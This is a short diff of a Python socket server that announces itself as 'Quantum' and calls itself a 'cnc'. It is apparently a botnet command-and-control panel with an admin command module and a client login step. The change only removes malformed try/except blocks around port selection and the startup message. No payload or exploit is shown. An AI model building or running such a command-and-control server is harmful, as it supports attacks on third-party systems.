@@ -40,10 +40,7 @@ from assets.Commands.admin import *
 buffer_length = 1024
 host = "0.0.0.0"
 timenow = datetime.datetime.now()
-try:
-        port = random.randint(0, 65535)
-       except:
-        print("[X] Error! Error binding port.")
+port = random.randint(0, 65535)
 if len(sys.argv) == 2:
         if sys.argv[1] == "-on":
                 host = requests.get("https://api.ipify.org").text
@@ -53,10 +50,7 @@ sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port B
 sock.bind((host, port))
 sock.listen()
 
-try:
-        print(f"Quantum Started | {host} | {port}")
-       except:
-        print("[X] Error! Error starting cnc. Are you connected to the internet?")
+print(f"Quantum Started | {host} | {port}")
 
 def handle_connection(client, addr):
         utils.set_Title(client, "Login")
